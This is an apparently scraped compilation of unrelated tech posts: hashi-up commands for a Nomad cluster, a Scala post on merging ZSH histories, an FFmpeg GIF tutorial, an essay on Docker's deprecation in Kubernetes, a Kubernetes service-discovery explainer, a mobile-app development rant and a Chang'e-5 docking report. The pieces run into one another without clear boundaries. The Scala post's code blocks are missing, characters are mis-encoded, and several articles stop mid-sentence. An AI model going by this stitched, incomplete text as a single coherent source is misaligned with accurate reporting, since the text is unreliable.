export AGENT_1_IP<span>=</span><span>192</span>.168.0.105
export AGENT_2_IP<span>=</span><span>192</span>.168.0.106

hashi-up nomad install --ssh-target-addr $AGENT_1_IP --ssh-target-user ubuntu --client --retry-join $SERVER_1_IP --retry-join $SERVER_2_IP --retry-join $SERVER_3_IP
hashi-up nomad install --ssh-target-addr $AGENT_2_IP --ssh-target-user ubuntu --client --retry-join $SERVER_1_IP --retry-join $SERVER_2_IP --retry-join $SERVER_3_IP</code></pre></div>
<h3 id="create-a-multi-server-ha-setup-with-consul">Create a multi-server (HA) setup with Consul</h3>

<p>If a Consul agent is already available on the Nomad nodes, Nomad can use Consul the automatically bootstrap the cluster. So after installing a Consul cluster on all nodes, with <code>hashi-up</code> the cluster, as explained above, can be installed with the following commands:</p>
<div><pre><code data-lang="bash">export SERVER_1_IP<span>=</span><span>192</span>.168.0.100
export SERVER_2_IP<span>=</span><span>192</span>.168.0.101
export SERVER_3_IP<span>=</span><span>192</span>.168.0.102
export AGENT_1_IP<span>=</span><span>192</span>.168.0.105
export AGENT_2_IP<span>=</span><span>192</span>.168.0.106

hashi-up nomad install --ssh-target-addr $SERVER_1_IP --ssh-target-user ubuntu --server --bootstrap-expect <span>3</span> 
hashi-up nomad install --ssh-target-addr $SERVER_2_IP --ssh-target-user ubuntu --server --bootstrap-expect <span>3</span> 
hashi-up nomad install --ssh-target-addr $SERVER_3_IP --ssh-target-user ubuntu --server --bootstrap-expect <span>3</span> 
hashi-up nomad install --ssh-target-addr $AGENT_1_IP --ssh-target-user ubuntu --client
hashi-up nomad install --ssh-target-addr $AGENT_2_IP --ssh-target-user ubuntu --client </code></pre></div>


<p>In this demo, I install a Nomad cluster onto eight separate DigitalOcean droplets. I takes only five minutes to get three Nomad servers and 5 Nomad clients up and running.</p>

<blockquote>
<p>Note: in the demo, the Nomad agents will join with the <a href="https://www.nomadproject.io/docs/configuration/server_join#cloud_auto_join" target="_blank">Cloud Auto-join</a> option, instead of using IP addresses</p>
</blockquote>

<p><a href="https://asciinema.org/a/350406" target="_blank"><img src="https://asciinema.org/a/350406.svg" alt="asciicast"></a></p>



<p>So what’s next? Well, this project is very young and does require some improvements. At the time of writing, you can spin up a Consul or Nomad cluster with some basic configuration. Still, some additional flags and feature will be useful to build a production-ready cluster with <a href="https://github.com/jsiebens/hashi-up" target="_blank">hashi-up</a>. For instance, the tool does not have support to enable Gossip Communication encryption, Agent Communication TLS encryption and ACLs.</p>

<p>So stay tuned!</p>

<blockquote>
<p><strong>update 2020-12-06</strong></p>

<p>Meanwhile, the hashi-up project progressed a little bit, and additional features like encryption and ACLs are available now. With the latest release, you could even install HashiCorp Vault using hashi-up.</p>

  <header><h3>
      Learning Scala - along with Groovy, Java and JVM ecosystem - was fun!
    </h3><p>
        Last updated on: <time>2020-12-06</time></p></header>

  

  

  <h3>Motivation</h3>

  <p>
    For the past two years I've been dabbling in DIY home automation. I ended up
    with a bunch of Raspberry PIs<sup><a id="ft_note_learning-scala_html_ft_1" data-tooltip-content="#ft_note_learning-scala_html_1">[1]</a></sup> all over the house, all running under Linux and connected via WiFi. They
    service some sensors and cameras, and show current date and time (among
    other dashboard-y things, like calendar or weather forecast) on a few
    displays around the house.
  </p>

  <p>
    I have a few Ansible<sup><a id="ft_note_learning-scala_html_ft_2" data-tooltip-content="#ft_note_learning-scala_html_2">[2]</a></sup> playbooks set up for running things like package- and system updates, but
    I still often <code>ssh</code> to the PIs for one-off tasks (in the beginning they all
    look like one-offs...) To do this comfortably, I installed ZSH<sup><a id="ft_note_learning-scala_html_ft_3" data-tooltip-content="#ft_note_learning-scala_html_3">[3]</a></sup> - my shell of choice - on the PIs, using the same <code>.zshrc</code> config
    everywhere. Just a handful of <code>if</code>s was enough to make my config portable,
    which was a pleasant surprise.
  </p>

  

  <p>
    One of the CLI tools I have set up in my <code>.zshrc</code> is <code>fzf</code><sup><a id="ft_note_learning-scala_html_ft_4" data-tooltip-content="#ft_note_learning-scala_html_4">[4]</a></sup>, which I use as a history search mechanism, replacing the
    default one under <code>Control + r</code>. It's incredibly useful, as it lets you
    narrow down the search incrementally and interactively, with fuzzy matching,
    which makes arriving at the intended command much faster than with the
    built-in search. You could say I got addicted to the ease of both browsing
    and searching through the shell history in an interactive manner. However,
    no matter what search method you use, <strong>if something's not there, you won't
    find it!</strong> That sounds trivial, but it connects to the topic of this
    post: how to merge ZSH history files.
  </p>

  <p>
    The use case should be clear by this point: very often, whatever I did on
    one PI, I would need to do, sooner or later, on one or two others. In such
    cases I, reflexively, tried to search for the needed command in the history
    of the <em>current shell</em>, which never saw that command... Obviously, I
    couldn't find it.
  </p>

  <p>
    Going through a few minutes of frustration a couple times was enough for me
    to start thinking about an automatic solution. How nice would it be if
    <em>something</em> gathered the histories from all the hosts and merged them
    into a single one, I thought.
  </p>

  <h3 id="learning-scala-why-scala-groovy-etc">Why Scala? Groovy? JVM?</h3>

  <p>
    As usual: by accident. It just so happened that I was learning Scala (and
    JVM in general) at the time for work, so I decided to use <em>the urge to
    automate</em> as a material for practice. As many of us do all the time, I
    thought, <q>how hard could it be?</q> and started setting up a project,
    which you can see on GitHub. In this post, I want to highlight nice things
    about Scala that I learned in the process.
  </p>

  <h3 id="learning-scala-gradle-project-setup">Project setup using Gradle</h3>

  <p>
    I'm not against the use of Scala build tool, <code>sbt</code>. I chose Gradle<sup><a id="ft_note_learning-scala_html_ft_5" data-tooltip-content="#ft_note_learning-scala_html_5">[5]</a></sup> simply because I had some prior experience with it, from my previous JVM
    project. That project had parts written in Java, Groovy, and Scala, and
    Gradle was the first tool we found which handled this case without tons of
    boilerplate code. Gradle has plugins for nearly everything, lightweight
    config syntax, and good performance. When starting the current project, I
    simply copy-pasted the <code>build.gradle</code> from the previous one, which was the
    fastest way to get started. The file looks roughly like this (click to
    unfold):

    You execute tasks configured in <code>build.gradle</code> with <code>gradle</code> command, which
    works kind of like <code>make</code> (or <code>gulp</code>, or <code>mix</code>, etc.). For example, the
    plugin called <code>'application'</code> defines a task called <code>'installDist</code>' which
    compiles and packages the project, giving you a script which starts your
    application. To compile and run the project in one go, I ended up with a
    following script, <code>run.sh</code>:

    It's worth noting that you can define your own tasks in <code>build.gradle</code>,
    using the full Groovy<sup><a id="ft_note_learning-scala_html_ft_6" data-tooltip-content="#ft_note_learning-scala_html_6">[6]</a></sup> language.

  <p>
    Interactive shell is always nice to have, and one of the three, called
    Ammonite<sup><a id="ft_note_learning-scala_html_ft_7" data-tooltip-content="#ft_note_learning-scala_html_7">[7]</a></sup>,
    is a Scala equivalent of IPython<sup><a id="ft_note_learning-scala_html_ft_8" data-tooltip-content="#ft_note_learning-scala_html_8">[8]</a></sup>,
    and is a pleasure to work with - I used it extensively to experiment with
    unfamiliar libraries, for example.
  </p>

  <p>
    At this point the setup is done. Let's start examining the implementation.
  </p>

  <h3>Fetching history files with SCP &amp; Scala external commands</h3>

  <p>
    Recounting the problem: I have a number of hosts on the network, where I
    tend to log in via <code>ssh</code> - which means I have <code>authorized_keys</code> properly
    configured already. I would like the shell history, which is a plain text
    file, to be synchronized among all the hosts. To do this, I need to fetch
    the history files from the network, process them somehow and put the merged
    file back on the hosts.
  </p>

  <p>
    In this situation, using <code>scp</code><sup><a id="ft_note_learning-scala_html_ft_9" data-tooltip-content="#ft_note_learning-scala_html_9">[9]</a></sup> command seemed the easiest way of copying
    files across my network. It's not Scala-specific, but there's no need to
    reinvent the wheel and write custom networking code for something this
    simple. Fortunately, Scala has a simple DSL for running external programs
    built-in, in the <code>sys.process</code> namespace (see
    <a href="https://www.scala-lang.org/api/current/scala/sys/process/index.html">the docs</a>.)
  </p>

  <p>
    While the DSL is powerful - even chaining I/O of a sequence of programs
    (like what the <code>|</code> operator does in most shells) is possible - what I really
    needed was just a return code. If it's equal to <code>0</code>, we know the transfer
    finished successfully; anything else signifies an error. To execute a
    command and get the exit code, you use <code>!</code> method, implicitly added to
    <code>String</code>s and <code>Seq</code>s:

    <h3>Downloading multiple files at a time with parallel collections</h3>

    <p>
      Most of my PIs are connected via WiFi, some of the older ones even use the
      2.5Ghz network. The transfer is not slow enough to be irritating, but
      that's only if you need something from a single host. If you try
      downloading many files in sequence, the latency will add up to the level
      where it's noticeable.
    </p>

    <p>
      Scala provides a wonderful, high-level construct for parallelizing
      processing: <a href="https://docs.scala-lang.org/overviews/parallel-collections/overview.html">parallel
      collections</a>. Basically, whenever you have code which maps (or folds)
      a function over a collection, you can transform said collection into a
      parallel one. Parallel collections implement <code>map</code> method which executes
      given function on a pool of threads. The result is another parallel
      collection, which you can transform back into a normal one, which will
      have the results of computations, in the correct order. The <code>toList</code>
      method which does this blocks and waits for all the items in all the
      threads to finish being processed. It looks like this:

<p>Sometimes, I would need to generate GIFs from videos of certain file size limits, convert from one video format to another. While there are lots of online conversion tools available, they donâ€™t provide privacy for the data and usually they donâ€™t have too many options. FFmpeg, which is open source and has been used in all those online conversion tools, has become my companion.</p>



<p>In this blog post, I am going to introduce some basic usages of FFmpeg for video processing and conversion.</p>

<h3 id="installation">Installation</h3>

<h4 id="ubuntu-1804-lts">Ubuntu 18.04 LTS</h4>

<div><div><pre><code><span>$ </span><span>sudo </span>apt-get update
<span>$ </span><span>sudo </span>apt-get <span>install </span>ffmpeg
</code></pre></div></div>

<h3 id="examples">Examples</h3>

<h4 id="video-samples">Video Samples</h4>

<p><a href="https://pixabay.com/">Pixabay</a> provides a lot of royalty-free images and videos. Letâ€™s get a 4K squirrel video from Pixabay.</p>

<div><div><pre><code><span>$ </span>wget https://pixabay.com/videos/download/video-948_source.mp4
<span>$ </span><span>ls</span> <span>-lh</span> video-948_source.mp4 
<span>-rw-r--r--</span> 1 leimao leimao 52M Feb  3  2017 video-948_source.mp4
</code></pre></div></div>

<p>This 10-second 4K MP4-format video takes 52MB.</p>

<h4 id="convert-video-to-gif">Convert Video to GIF</h4>

<p>We use the default settings to convert with multithreads to accelerate the process.</p>

<div><div><pre><code><span>$ </span>ffmpeg <span>-i</span> video-948_source.mp4 <span>-threads</span> 16 video-948_source.gif
<span>$ </span><span>ls</span> <span>-lh</span> video-948_source.gif 
<span>-rw-r--r--</span> 1 leimao leimao 1.4G Dec 16 18:42 video-948_source.gif
</code></pre></div></div>

<p>Holy! The size of the generated GIF is 1.4GB! We need to do something to reduce the size.</p>



<p>There are generally a couple of ways to achieve this:</p>

<ul>
  <li>Reduce resolution</li>
  <li>Reduce FPS (frame per second)</li>
  <li>Clip</li>
</ul>

<p>In this case, I did:</p>

<div><div><pre><code>$ ffmpeg -i video-948_source.mp4 -ss 1 -t 5 -vf fps=10,scale=480:-1 -threads 16 video-948_source.gif
$ ls -lh video-948_source.gif 
-rw-r--r-- 1 leimao leimao 3.1M Dec 16 18:54 video-948_source.gif
</code></pre></div></div>

<ul>
  <li><code>-ss</code> is the starting time of the video clip from the original video. In this case, it is 1 second.</li>
  <li><code>-t</code> is the duration of the video clip from the original video. In this case, it is 5 seconds.</li>
  <li><code>-vf</code> is the filter_graph. In this case, I set the FPS to be 10 and reduce the resolution to be 3840 Ã— 2160 to 480 Ã— 270.</li>
</ul>

<p>The size of the generated GIF this time is 3.1MB. This is quite suitable for many purposes.</p>

    <figcaption>The generated GIF from the Squirrel Video</figcaption>
</figure>
</div>

<h4 id="more-options">More Options</h4>

<p>FFmpeg could do conversions between different formats, such as MP4 to AVI, etc. Simply change the <code>gif</code> in the command to <code>avi</code> and you are all set.</p>



<p>There are also more sophisticated options from FFmpeg, please check <code>ffmpeg --help</code> for more details.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><h3>Docker's Second Death</h3></p><h3 id="feels-like-forever">Feels Like Forever</h3><p>Perhaps not quite forever, but the history with Docker <em>feels</em> really long in good and bad ways. I had joined Red Hat in the summer of 2015, the same summer that OpenShift 3.0 went GA. This was a remarkable event because it marked a redesign of the platform onto Kubernetes which itself had just gone to v1.0 (this is the same timeframe that GKE went GA, if you can believe it’s that old). Like many, I had no clue what Kubernetes or OpenShift were, and I definitely didn’t know much about Docker. I knew <em>of</em> containers. By fall I was neck deep in all three, and in love with the ecosystem a few months after.</p><p>The next spring was my first “real” encounter with Docker Inc. I didn’t attend Red Hat Summit 2016, but I distinctly remember that being the year that Docker really made its first outward antagonistic move against Red Hat OpenShift, at Red Hat’s own event. They were giving out the following shirt:</p><p><img src="https://www.tariqislam.com/images/dockerpatch.jpg" alt="docker-shirt"></p><p>To briefly summarize, this was an attack on Red Hat’s model of backporting patches to older versions of software (also known as “enterprise support”). Red Hat at that time shipped a version of Docker that was just slightly behind the latest cut, whereas Docker shipped their latest. I won’t go into the details of why that matters because there is still a debate today about whether backporting patches is better for an organization versus staying on the latest version of a thing (the latter has gotten considerably better in recent times). This was significant because up until that time, Docker was an integral part of the OpenShift narrative. We sold one with the other and the underlying assumption by most if not all of us was that Docker was just a great tech. In retrospect, this should have been expected as Docker Inc. started making its moves into the enterprise space and suddenly stopped being just great tech.</p><h3 id="it-was-inevitable">It Was Inevitable</h3><p>The early platform wars, as I call them, were primarily focused around OpenShift, Docker, and Pivotal. Pivotal had made significant inroads into enterprise organizations early on, and for good reason: the platform experience was pretty great. Couple that with Pivotal Labs and you had some pretty good mojo. Docker was the up and comer. It was the industry darling making a splash and it had the tech that everyone wanted or that everyone was already using. Kubernetes was still a bit of a question mark. I spent a lot of my time talking to organizations about the nuts and bolts of Kubernetes and why it mattered, or more accurately: why it should matter to them. The move by Docker to knock on OpenShift forced Red Hat messaging to over-index on Kubernetes and Linux over and above anything else. It worked and the industry caught up.</p><p>Docker, still in its industry darling state, responded quickly with Docker Swarm but never really caught on. Swarm was eventually overwhelmed (pun intended) by the uptake of Kubernetes across the industry, and this was when it died the first time: it lost the platform wars and became the very first commodity in the cloud native ecosystem. The second half of 2016 is really when Kubernetes edged out Swarm. This was made evident by the keynote demo at DockerCon 2017 in the following Spring when the presenters showcased Docker’s integration with Kubernetes on the big stage. Notably, that was the last “big” DockerCon that made a splash. From there on out, it was the Kubernetes/CNCF show.</p><h3 id="docker-debt">Docker Debt</h3><p>In all this time, Docker was always an integral part of Kubernetes. This was the relationship:</p><p><img src="https://www.tariqislam.com/images/dockershim.png" alt="dockershim"></p><p>And for the last 19 releases, that chain is what has been supported in Kubernetes. All that just to spin up a pod with a container in it. Docker went from necessity to technical debt. And out of all that, the community laboured until now where Docker will be deprecated in the next release of 1.20. The community has (rightfully) carried the technical debt of Docker for years to ensure the industry had what it needed for the most seamless experience given the ubiquity of the docker daemon. Here is what’s been around for a little while, but will be officially prime time in 1.20 and beyond:</p><p><img src="https://www.tariqislam.com/images/withoutdocker.png" alt="withoutdocker"></p><p>It’s a great simplification, and a return to consistency. To help visualize why this was necessary, I encourage you to view Docker as a platform abstraction on top of containers which are just an aggregate of some Linux constructs. Part of this abstraction involved an integration between the docker platform and containerd, the latter of which lives on today as arguably the most popular container runtime. Docker was never the runtime. Docker simply made containerd and other Linux constructs easy to work with so that container management would be a breeze. Instead of a dozen lines of code to create and deploy a running container, all you needed was:</p><pre><code>docker run
</code></pre><p>But like any platform, that convenience comes with a lot of bloat and technical debt. Especially over time. The removal of docker and the optimization of containerd marks a cultural shift of sorts for the cloud native landscape. None of this is meant to dismiss Docker Inc. Kubernetes today would not be where it is without Docker Inc. That’s a fact. The technologies and the competition that Docker Inc drove were some of the best things to ever happen to the industry. Now as far as turning a profitable business model out of open source technology goes, Docker Inc will likely be studied as a cautionary flash in the pan. Still, it’s important that we separate out the company’s contributions versus its business model. What’s left of the Docker platform, at this point, are its shadows within Kubernetes platforms. Though it does live on strongly within CI/CD ecosystems and, ostensibly, the inner loop of development thanks to the de facto standard Dockerfile. It is a testament to the power that Docker Inc once had, that its technology lived on far beyond the obsolescence of the company until community innovation caught up to it. With all the years of bloat baked into the platform, it’s really just a matter of time before other areas to the left of the platform shed the debt of the Docker daemon.</p><p>While it had an amazing journey and an indelible impact to the industry, practically speaking Docker is dead and dying.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a name="cut"></a>
Before jumping to any Kubernetes specifics, let's talk about the service discovery problem in general.</p>
<h2 id="service-discovery-problem">Service discovery problem</h2>
<p>In the world of web service development, it's a common practice to run multiple copies of a service at the same time. Every such copy is a separate instance of the service represented by a network endpoint (i.e. some <em>IP</em> and <em>port</em>) exposing the service API. Traditionally, virtual or physical machines have been used to host such endpoints, with the shift towards containers in more recent times. Having multiple instances of the service running simultaneously increases its availability and helps to adjust the service capacity to meet the traffic demand. On the other hand, it also complicates the overall setup - before accessing the service, a client (the term <em>client</em> is intentionally used loosely here; oftentimes a client of some service is another service) needs to figure out the actual IP address and the port it should use. The situation becomes even more tricky if we add the ephemeral nature of instances to the equation. New instances come and existing instances go because of the non-zero failure rate, up- and downscaling, or maintenance. That's how a so-called <strong><em>service discovery</em></strong> problem arises.</p>
<div>
    <p><img src="https://iximiuz.com/service-discovery-in-kubernetes/service-discovery-problem.png" width="100%"></p><p><i>Service discovery problem.</i></p>
</div>


<h2 id="server-side-service-discovery">Server-side service discovery</h2>
<p>A pretty common way of solving the service discovery problem is putting a load balancer <em>aka</em> reverse proxy (e.g. Nginx or HAProxy) in front of the group of instances constituting a single service. An address (i.e. DNS name or less frequently IP) of such a load balancer is a much more stable piece of information. It can be communicated to the clients on development or configuration stages and assumed invariable during a single client lifespan. Then, from the client standpoint, accessing the multi-instance service is no different from accessing a single network endpoint. In other words, <a href="https://microservices.io/patterns/server-side-discovery.html">the service discovery happens completely on the server-side</a>.</p>
<div>
    <p><img src="https://iximiuz.com/service-discovery-in-kubernetes/server-side-service-discovery.png" width="100%"></p><p><i>Server-side service discovery.</i></p>
</div>

<p>The load balancer abstracts the volatile set of service instances away from the clients. However, the load balancer itself needs to be aware of the up to date state of the service fleet. This can be achieved by adding a <a href="https://microservices.io/patterns/service-registry.html"><em>service registry</em></a> component. On the startup, an instance needs to be added to the registry database. Upon the termination, the instance needs to be removed from it. One of the main tasks of the load balancer is to dynamically update its routing rules based on the service registry information.</p>
<p>While it looks very appealing from the client standpoint, the server-side service discovery may quickly reveal its downsides, especially in highly-loaded environments. The load balancer component is a <strong>single point of failure and a potential throughput bottleneck</strong>. To overcome this, the load balancing layer needs to be designed with a reasonable level of redundancy. Additionally, the load balancer may <strong>need to be aware of all the communication protocols</strong> used between services and clients and there will be always an <strong>extra network hop</strong> on the request path.</p>
<h2 id="client-side-service-discovery">Client-side service discovery</h2>
<p>Can we solve the service discovery problem without introducing the centralized load balancing component? Sure! If we keep the <em>service registry</em> component around, we can teach the clients to look up the service instance addresses in the <em>service registry</em> directly. After fetching the full list of IP addresses constituting the service fleet, a client could pick up an instance based on the load balancing strategy at its disposal. In such a case, <a href="https://microservices.io/patterns/client-side-discovery.html">the service discovery would be happening solely on the client-side</a>. Probably the most prominent real-world implementation of the client-side service discovery is Netflix <a href="https://github.com/Netflix/eureka">Eureka</a> and <a href="https://github.com/Netflix/ribbon">Ribbon</a> projects.</p>
<div>
    <p><img src="https://iximiuz.com/service-discovery-in-kubernetes/client-side-service-discovery.png" width="100%"></p><p><i>Client-side service discovery.</i></p>
</div>

<p>The benefits of the client-side approach mostly come from the absence of the load balancer. There is neither a <strong>single point of failure</strong> nor a potential <strong>throughput bottleneck</strong> in the system design. There is also one less moving part which is usually a good thing and <strong>no extra network hops on the packet path</strong>.</p>
<p>However, as with the server-side service discovery, there are some significant drawbacks as well. Client-side service discovery <strong>couples clients with the <em>service registry</em></strong>. It <strong>requires some integration code</strong> to be written for every programming language or framework in your ecosystem. And obviously, this <strong>extra logic complicates the clients</strong>. There seem to be an effort to <a href="https://iximiuz.com/en/posts/service-proxy-pod-sidecar-oh-my/">offload the client-side service discovery logic to the service proxy sidecars</a> but that's already a different story...</p>
<h2 id="dns-and-service-discovery">DNS and service discovery</h2>
<p>Service discovery can be implemented in more than just two ways. There is a well-known <a href="https://en.wikipedia.org/wiki/Zero-configuration_networking#DNS-based_service_discovery">DNS-based service discovery (DNS-SD)</a> approach that actually even predates the massive spread of microservices. Quoting the Wikipedia, <i>"a client discovers the list of available instances for a given service type by querying the DNS PTR record of that service type's name; the server returns zero or more names of the form <code>&lt;Service&gt;.&lt;Domain&gt;</code>, each corresponding to a SRV/TXT record pair. The SRV record resolves to the domain name providing the instance..."</i> and then another DNS query can be used to resolve a chosen instance's domain name to the actual IP address. Wow, so many layers of indirection, sounds fun 🙈</p>
<p>I never worked with DNS-SD, but to me, it doesn't sound like full-fledged service discovery. Rather, DNS is used as a <em>service registry</em>, and then depending on the dislocation of the code that knows how to query and interpret DNS-SD records, we can get either a <a href="https://github.com/benschw/srv-lb">canonical client-side</a> or a <a href="https://www.haproxy.com/blog/dns-service-discovery-haproxy/">canonical server-side</a> implementation.</p>
<p>Alternatively, <a href="https://en.wikipedia.org/wiki/Round-robin_DNS">Round-robin DNS</a> can be (ab)used for service discovery. Even though it was originally designed for load balancing, or rather load distribution, having multiple A records for the same hostname (i.e. service name) returned in a rotating manner implicitly abstracts multiple replicas behind a single service name.</p>
<p>In any case, <strong>DNS has a significant drawback when used for service discovery</strong>. Updating DNS records is a slow procedure. There are <strong>multiple layers of caches</strong>, including the client-side libraries, and historically record's TTL isn't strictly respected. As a result, propagating the change in the set of service instances to all the clients can take a while.</p>
<h2 id="entering-kubernetes-realm">Entering Kubernetes realm</h2>
<p>First, let's play an analogy game!</p>
<p>If I were to draw some analogies between Kubernetes and more traditional architectures, I'd compare Kubernetes <a href="https://kubernetes.io/docs/concepts/workloads/pods/"><em>Pods</em></a> with service instances. <em>Pods</em> are <a href="https://www.reddit.com/r/kubernetes/comments/k0zc0m/kubernetes_pods_are_logical_hosts_or_simply/?utm_source=share&amp;utm_medium=web2x&amp;context=3">many things</a> to <a href="https://twitter.com/iximiuz/status/1331630336707596288?s=20">many people</a>, however, when it comes to networking <a href="https://kubernetes.io/docs/concepts/cluster-administration/networking/#the-kubernetes-network-model">the documentation clearly states that</a> <i>"...Pods can be treated much like VMs or physical hosts from the perspectives of port allocation, naming, service discovery, load balancing, application configuration, and migration."</i></p>
<p>If <em>Pods</em> correspond to individual instances of a service, I'd expect a similar analogy for the <em>service</em>, as a logical grouping of instances, itself. And indeed there is a suitable concept in Kubernetes called... surprise, surprise, a <a href="https://kubernetes.io/docs/concepts/services-networking/service/"><em>Service</em></a>. <i>"In Kubernetes, a Service is an abstraction which defines a logical set of Pods and a policy by which to access them (sometimes this pattern is called a micro-service)."</i></p>
<p>Strengthening the analogy, the set of Pods making up a Service should be also considered ephemeral because neither the Pods' headcount nor the final set of IP addresses is stable. Thus, in Kubernetes, the problem of providing a reliable <strong>service discovery</strong> remains actual.</p>
<p>While creating a new Service, one should choose a name that will be used to refer to the set of Pods constituting the service. Among other things, the Service maintains an up to date list of IP addresses of its Pods organized as an <a href="https://kubernetes.io/docs/reference/glossary/?all=true#term-endpoints"><em>Endpoints</em></a> (or <a href="https://kubernetes.io/docs/concepts/services-networking/endpoint-slices/"><em>EndpontSlice</em></a> since Kubernetes 1.17) object. <a href="https://kubernetes.io/docs/concepts/services-networking/service/#cloud-native-service-discovery">Citing the documentation</a> one more time, <i>"...if you're able to use Kubernetes APIs for service discovery in your application, you can query the API server for Endpoints,</i> [I guess using the Service name] <i>that get updated whenever the set of Pods in a Service changes."</i> Well, sounds like an invitation to implement a <del>cloud-native</del> Kubernetes-native client-side service discovery with the Kubernetes control plane playing (in particular) the role of the <em>service registry</em>.</p>
<div>
    <p><img src="https://iximiuz.com/service-discovery-in-kubernetes/kube-native-service-discovery.png" width="100%"></p><p><i>Kubernetes-native client-side service discovery.</i></p>
</div>

<p>However, the only real-world usage of this mechanism I've stumbled upon so far was in the <a href="https://linkerd.io/2020/07/23/under-the-hood-of-linkerds-state-of-the-art-rust-proxy-linkerd2-proxy/#the-life-of-a-request"><em>service mesh</em></a> kind of software. It's a bit unfair to mention it here though because <em>service mesh</em> itself is needed to provide, in particular, the service discovery mechanism for its users. So, if you're aware of the client-side service discovery implementations leveraging Kubernetes Endpoints API please drop a comment below.</p>
<p>Luckily, as with many other things in Kubernetes, there's more than one way <del>to skin a cat</del> to get the service discovery done. And the applications that weren't born cloud-native (i.e. 99% of them) will likely find the next service-discovery mechanism much more appealing.</p>
<h2 id="network-side-service-discovery">Network-side service discovery</h2>
<p><i>Disclaimer: I've no idea if there is such thing as <em>network-side</em> service discovery in other domains and I've never seen the usage of this term in the microservices world. But I find it funny and suitable for the purpose of this paragraph.</i></p>
<p>In Kubernetes, the name of a Service object must be a valid <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/names/#dns-label-names">DNS label name</a>. It's not a coincidence. When the DNS add-on is enabled (<a href="https://kubernetes.io/docs/concepts/services-networking/service/#dns">and I guess it's almost always the case</a>), every Service gets a DNS record like <code>&lt;service-name&gt;.&lt;namespace-name&gt;</code>. Obviously, this name can be used by applications to access the service and it simplifies the life of the clients to the highest possible extent. A single well-known address behind every Service <strong>eradicates the need for any service discovery logic on the client-side</strong>.</p>
<p>However, as we already know, DNS is often ill-suited for service discovery and <a href="https://kubernetes.io/docs/concepts/services-networking/service/#why-not-use-round-robin-dns">the Kubernetes ecosystem is not an exception</a>. Therefore, instead of using round-robin DNS to list Pods' IP addresses, Kubernetes introduces one more IP …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

<p>This year I thought about building my ideas and I’ve already done a post on “Drone Trails” and the motivation behind it. The part I didn’t speak about much is how hard it was to develop. I started building around March, released my app in September on iOS. 10 months later I’ll finally have the Android app ready.</p>

<p>What ticks me off in the entire process is the time it takes to learn, build and create mobile apps. This is a whole new world to be honest. A lot of the process is very discouraging because to me the thing that makes coding interesting is “You get to see what you build <em>quickly</em>”. It’s that dopamine hit that keeps me going and when that disappears (the tipping point) - the motivation to finish something is entirely driven by will power and no longer the passion for the idea.</p>

<p>There are areas and choices of implementation that will make life easier here but honestly if there is a tool out there to help me build and design quickly - I would try it in an instant (and there isn’t IMO).</p>

<h3 id="the-build-tools">The build tools</h3>

<p>This is by far the most frustrating part of the process. To build a crud app with some basic server functionality including hooking up firebase - I needed about dozens of dependencies and building the app took ~ 20 mins every time I needed to do. Why is compiling such a pain ? It’s the most visible component in terms of building/iterating quickly and this is the part that takes up most of the time.</p>

<p>The dependency management tool is janky at times that you need to unlink and link them back. Worse - it shits the bed and XCode complains about stuff you didn’t even know existed in your app. It takes much of your time to understand this and about the time you figure this out, you have other problems of managing your release environments to test things quickly.</p>

<p>It takes scripts and Makefile recipes to make this happen quickly. Why can’t this be so much easier ? I learned you can circumvent this issue by using React Native which I ended up doing because I didn’t want to do Kotlin and spend 3 months learning that.</p>

<h3 id="the-app-specific-concepts">The app specific concepts</h3>

<p>I come from an DevOps/Infra engineer background - so mobile app building was something new to me. There are tons of resources out there explaining how to build but nothing that talks about the why. On top of this - there are some programming paradigms that’s very specific to apps that makes life even more trickier. I had trouble understanding:</p>
<ul>
  <li>delegate pattern</li>
  <li>cocoapod dependency management</li>
  <li>property setters and observables</li>
  <li><em>design</em></li>
</ul>

<p>The last point is something I’m going to stress on. There is a certain acumen one needs to develop to build something <em>useful</em>. By useful - I mean something that can be tolerated by your users. This is not the same as knowing how to build because you have to understand why you have to build here.</p>

<p>I can build the worst UI experience with some really good functionality and lose the narrative. You want to learn those and that takes time. My 2 cents on people building curriculum around app development - include design and user experience. It’s underrated and taken so lightly that judgements like “Design can’t be so hard” will bite you for sure.</p>

<p>Don’t even get me started on UI building in Android - that stuff still uses xml and is way behind when the tool chain that makes iOS so good. I quickly resorted to React native for building the Android app. I will wrote more there in a new post since I was pleasantly surprised I could replicate functionality in 2 weeks.</p>

<h3 id="will-no-code-tools-solve-this-">Will No-code tools solve this ?</h3>

<p>I don’t think so. You need something in the middle. The grass looks greener thinking about non-engineer customer base here but it is equally greener on this side of the field too :)</p>

<p>You are looking at folks who want to build the courage to try out ideas outside of their regular jobs. <em>Saving time</em> is the most valuable thing you can buy then from a development perspective. Prototyping takes precedence and feedback becomes equally important.</p>

<p>There isn’t a single tool out there that hits this sweet spot including feedback. It’s extremely hard to get noticed and it is even harder to get testers. I would totally get on the bandwagon if something out there provides all this functionality.</p>

<h3 id="final-thoughts">Final Thoughts</h3>

<p>There are tons of tools out there to make life easier but finding and selecting one is a challenge. If your app is slightly non-trivial - the research needed exponentially rises. There are fewer resources out there that points you to the bits you should care about. Build tutorials that teaches fundamentals because questioning the why(s) is even harder than teaching the how(s).</p>

<p>Screen image captured at Beijing Aerospace Control Center in Beijing, capital of China, Dec. 6, 2020 shows the rendezvous and docking of the ascender of China's Chang'e-5 probe with the orbiter-returner combination. The ascender of China's Chang'e-5 probe successfully rendezvoused and docked with the orbiter-returner combination in lunar orbit at 5:42 a.m. (Beijing Time) on Sunday, the China National Space Administration (CNSA) has announced. This is the first time Chinese spacecraft have carried out rendezvous and docking in lunar orbit. (Xinhua/Jin Liwang) </p><p>&nbsp;After a successful liftoff from the lunar surface and rendezvous in lunar orbit, China's Chang'e-5 lunar probe docked with the orbital module on Sunday, with the lunar samples safely transferred to the return capsule, China's first successful attempt at such a maneuver made possible by cutting-edge technologies.&nbsp;</p><p>It is a visionary endeavor that lays a technological foundation for future deep-space exploration, observers said.&nbsp;</p><p>The probe's ascender successfully docked with the orbital module in lunar orbit on Sunday at 5:42 am, some 380,000 kilometers from the Earth, and completed the lunar sample transfer at 6:12 am from the ascender to the return capsule, the Global Times learned from the China National Space Administration (CNSA).&nbsp;</p><p>It is the first time China has achieved a probe rendezvous and docking in lunar orbit. Under autonomous control from the probe and long-distance guidance from the command team in ground control, the orbital module approached the ascender after it launched from the moon, and captured it in a smooth 